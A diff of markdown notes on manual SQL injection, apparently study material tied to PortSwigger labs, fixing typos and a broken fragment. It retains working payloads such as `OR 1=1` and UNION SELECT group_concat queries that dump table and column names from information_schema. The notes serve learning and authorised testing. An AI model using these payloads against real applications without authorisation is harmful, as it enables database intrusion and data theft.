@@ -6,11 +6,11 @@ SQL injection can be detected manually by using a systematic set of tests agains
 
 * Submitting the single quote character `'` and looking for errors or other anomalies.
 * Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
-* Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
+* Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, then looking for differences in the application's responses.
 * Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
 * Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.
 
-### **Determine DB Verison**
+### **Determine DB Version**
 
 * Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software
   * MySQL - SELECT @@version
@@ -37,7 +37,7 @@ SQL injection can be detected manually by using a systematic set of tests agains
     * SELECT \* FROM all\_tables
   * And you can list columns by querying all\_tab\_columns:
     * SELECT \* FROM all\_tab\_columns WHERE table\_name = 'USERS'
-* We can also get it using a UNION SELECT query (Exmaple for a 5 column table)
+* We can also get it using a UNION SELECT query. Example for a five-column table:
   * `input' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()#`
 * [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
 * [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
@@ -56,8 +56,7 @@ SQL injection can be detected manually by using a systematic set of tests agains
 * The \*  from the above SELECT query can be replaced with whichever piece of information you like from the information\_schema.tables table, such as TABLE\_SCHEMA, TABLE\_NAME, TABLE\_TYPE.
 * Once information regarding the tables in the database has been discovered, it becomes possible to query the tables for their columns. This can be achieved using the following syntax:
   * SELECT \* FROM information\_schema.columns WHERE table\_name='Table'
-* We can do this with t
-* Or we can also get it using a UNION SELECT query:
+* You can also retrieve column names using a UNION SELECT query:
   * \
     `input' UNION SELECT 1,group_concat(column_name, 0x0a),3,4,5 FROM information_schema.columns WHERE table_name="customers"#`
 
